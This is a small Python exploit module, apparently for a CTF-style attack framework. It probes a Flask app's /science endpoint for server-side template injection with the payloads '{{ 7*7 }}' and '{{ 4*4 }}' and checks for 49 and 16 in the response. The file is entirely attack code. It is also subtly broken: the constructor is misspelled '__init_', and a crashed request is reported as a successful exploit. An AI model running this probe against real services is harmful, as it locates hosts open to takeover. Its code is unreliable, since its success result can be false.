from ExploitFrame import ExploitFrame
import requests
import structlog

logger = structlog.get_logger()

class Exploit(ExploitFrame):
    def __init_(self, serviceInfo):
        self.name = 'flask_exploit'
        self.output = None
        ExploitFrame.__init__(self, serviceInfo)

    def exploit(self):
        url = 'http://{}:{}/science'.format(self.serviceInfo.serviceHost,self.serviceInfo.servicePort)
        data = {'chem1': '{{ 7*7 }}', 'chem2': '{{ 4*4 }}'}
        try:
            exp = requests.post(url, data=data)
            if 'The result of combining 49 and 16 is:' in exp.text:
                self.output = True
            else:
                self.output = False

        except Exception as e:
            msg = "Exploit crashed: {}".format(e)
            logger.info('Flask Exploit', msg=msg, serviceInfo=self.serviceInfo.__dict__)
            self.output = True

    def exploitSuccess(self):
        return self.output
